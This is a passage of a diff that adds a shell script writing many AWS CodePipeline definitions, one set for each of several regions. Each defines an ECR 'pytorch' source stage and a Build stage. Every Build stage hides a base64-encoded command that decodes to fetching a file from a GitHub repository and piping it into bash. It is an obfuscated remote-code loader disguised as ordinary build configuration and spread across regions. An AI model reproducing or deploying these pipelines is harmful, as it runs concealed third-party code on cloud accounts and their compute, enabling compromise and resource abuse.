+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > uswest23.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "uswest2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsouth11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsouth1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsouth12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsouth1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsouth13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsouth1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast31.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast3-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast32.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast3-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast33.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast3-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast21.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast22.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast23.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsoutheast11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsoutheast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsoutheast12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsoutheast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsoutheast13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsoutheast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsoutheast21.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsoutheast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apsoutheast22.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsoutheast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
